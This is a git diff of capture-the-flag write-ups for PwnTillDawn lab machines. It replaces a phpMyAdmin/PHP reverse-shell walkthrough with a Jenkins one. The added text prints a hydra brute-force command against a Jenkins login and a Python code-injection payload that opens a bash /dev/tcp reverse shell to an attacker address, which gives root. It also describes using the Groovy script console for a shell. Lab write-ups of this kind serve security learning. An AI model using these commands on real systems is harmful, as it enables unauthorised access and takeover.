@@ -6,100 +6,110 @@
 ![image](https://agent-skywalker.github.io/post/ptd/images/badge.png)
 
 ***
-
-First of all, let run our nmap scan
-
-```shell
-# Nmap 7.94 scan initiated Sun Sep  3 15:37:00 2023 as: nmap -p- -sVC -v --min-rate=1000 -T4 -oN nmap.txt 10.150.150.57
-Increasing send delay for 10.150.150.57 from 0 to 5 due to 109 out of 272 dropped probes since last increase.
-Increasing send delay for 10.150.150.57 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
-Nmap scan report for 10.150.150.57
-Host is up (0.21s latency).
-Not shown: 65131 filtered tcp ports (no-response), 401 closed tcp ports (conn-refused)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+# Reconnaissances 
+Full Nmap scan
+```
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
-|   3072 e8:60:09:66:aa:1f:e8:76:d8:84:16:18:1c:e4:ee:32 (RSA)
-|   256 92:09:d3:0e:f9:47:48:03:9f:32:9f:0f:17:87:c2:a4 (ECDSA)
-|_  256 1d:d1:b3:2b:24:dc:c2:8a:d7:ca:44:39:24:c3:af:3d (ED25519)
-53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
-| dns-nsid: 
-|_  bind.version: 9.16.1-Ubuntu
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-title: Index of /
-| http-ls: Volume /
-| SIZE  TIME              FILENAME
-| 147   2020-06-10 11:25  note.html
-|_
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-| http-methods: 
-|_  Supported Methods: GET POST OPTIONS HEAD
+|   2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)
+|   256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)
+|_  256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)
+30609/tcp open  http    Jetty 9.4.27.v20200227
+|_http-server-header: Jetty(9.4.27.v20200227)
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sun Sep  3 15:42:50 2023 -- 1 IP address (1 host up) scanned in 350.36 seconds
 ```
 
-Checking Port `80/HTTP` we have a note.html file, that says
+The nmap scan shows a Jenkins server running on port 30609, navigating to the jenkin server is an administrator login page
 
+![[Pasted image 20240624002503.png]]
+
+Trying default jenkin's credentials didn't work so i had to brute force for credentials.
+
+I used burp suite to capture the login request so i can use it on hydra
+![[Pasted image 20240624003056.png]]
+
+# Exploitation 
+
+Then i use the following command to brute force admin password
 ```
-Morty,  
-if you read this: I've already configured your domain 'mortysserver.com' on this server, don't bother me with it anymore!!  
--Rick
-```
-
-![](https://i.imgur.com/f8atRIZ.png)
-
-Since we have been referred to **mortysserver.com** , we will add it to our `/etc/hosts` file , Navigating to **mortysserver.com** we have another website that seems like a password clue , `Fl4sk#!`
-
-![](https://i.imgur.com/nsok2MH.png)
-
-
-Viewing `Page-Source` we have a `screen.jpeg` file, we can download and analyze it to see if we can extract information from it
-
-![](https://i.imgur.com/XdgAhmQ.png)
-
-At first it doesn't seem like there is any embedded data, but using the password we got earlier to decrypt hidden information in the **screen.jpeg** file, we found a `TXT` file
-
-![](https://i.imgur.com/kxDYKHf.png)
-
-```shell
-sec-fortress@Pwn-F0rk-3X3C:~/PTD/morty$ cat keytotheuniverse.txt 
-rick:WubbaLubbaDubDub1!
+hydra -l admin -P  /usr/share/wordlists/rockyou.txt  10.150.150.38 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError" -v -t 64 -s 30609
 ```
 
-The content of the file looks like a credential, Tried it for `SSH` but didn't work, We have port `53/DNS` opened, so we can do a zone transfer
+since as burp suite captures another get request `loginError` when we submit a wrong log in info, we specify it in our hydra with `F=` option (F for failing strings followed by an equal sign `=` and a string which appears in a failed attempt)
 
-![](https://i.imgur.com/mg6a8hd.png)
+I was able to log in with the credentials found
 
-Nice we have **rickscontrolpanel.mortysserver.com** subdomain, add it to your `/etc/hosts` file and Navigate to the website, In which we have a **PhpMyAdmin** page
+![[Pasted image 20240624234618.png]]
 
-![](https://i.imgur.com/QKIlf9M.png)
 
-Trying out the credentials we found earlier , which is `rick:WubbaLubbaDubDub1!` , we got a successfully login 🤟 , Also we found **FLAG2.txt** and we now know that the website uses **PhpMyAdmin Version - 4.8.1**
+![[Pasted image 20240624002122.png]]
 
-![](https://i.imgur.com/cxJOvWE.png)
+Navigating to People i found `flag69`
 
-Enumerating that version, we find an exploit, you can get it from [here](https://www.exploit-db.com/exploits/50457) , Note that there is also a manual method to get shell
+![[Pasted image 20240624010137.png]]
 
-![](https://i.imgur.com/yfx4iDf.png)
+Under `Manage Jenkins` there's a script console that can run arbitrary groovy script on the server, so i generated a groovy reverse sell script and executed it in the script console to gain reverse shell.
 
-![](https://i.imgur.com/23sR0vL.png)
+![[Pasted image 20240624011333.png]]
 
-Since we can execute commands {RCE}, then definitely, we can send a `PHP` reverse shell to the target then load it up on our browser
+![[Pasted image 20240624234537.png]]
 
-![](https://i.imgur.com/OcxCIIT.png)
+> You can also get a reverse shell from jenkins by creating a new project and building it
 
-Now we can navigate to **/fuck.php** on the website, but first of all make sure you start your Netcat listener with the right IP Address and Port (Note: If you are not getting back a shell, Use Pentest Monkey payload, You can get it from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php))
+I then change directory into the home directory of the user i got a shell with and found `flag70`
 
-![](https://i.imgur.com/tZ7SSuB.png)
+![[Pasted image 20240624234848.png]]
 
-![](https://i.imgur.com/QFrTa40.png)
+Checking for the active connections on the system using `netstat -ano` i found a service running locally on port `8080` 
 
-I tried to perform Privilege Escalation, But i don't think it is possible because we have found **FLAG3.txt** , which is located under the User **morty** home's directory
+![[Pasted image 20240625000114.png]]
 
-Big shout out to [wizlynxgroup](https://www.wizlynxgroup.com/) and [Pwntilldawn](https://online.pwntilldawn.com/)
+So i transferred chisel to the box so i can forward the port to my attacker machine
 
-<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
->>>>>>> c14ed40d8f04a4603b26537c03afd993024c49f0
+After forwarding the port i navigated to `127.0.0.1:8080` and saw this page
+
+![[Pasted image 20240625001356.png]]
+
+Viewing the page source of the page was a link directing to the next flag
+
+![[Pasted image 20240625001757.png]]
+
+Navigating to it i found `flag71`
+
+![[Pasted image 20240625001857.png]]
+
+
+# Privilege Escalation
+
+So doing some future enumeration with `pspy` to see processes running on the target machine i found this process running `/usr/bin/python /root/mycalc/untitled.py 127.0.0.1 8080` as root.
+
+![[Pasted image 20240625011927.png]]
+
+Since i can not read or modify `/root/mycalc/untitled.py 127.0.0.1 8080` doing some research online i found a blog about hacking python applications [here](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1) 
+
+So navigating back to the python application running locally on port 8080 i tried getting another reverse shell using the payloads found [here](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1) 
+
+so i setup my netcat listener and tried different payloads
+
+I ran the following payload in the first box of the python application
+
+```python
+__import__('os').system('bash -c "bash -i >& /dev/tcp/10.66.66.x/33006 0>&1"')#
+```
+
+![[Pasted image 20240625013930.png]]
+
+
+And i got a reverse shell back as root
+
+![[Pasted image 20240625013952.png]]
+
+I was able to navigate into the root folder and get `flag72`
+
+![[Pasted image 20240625014121.png]]
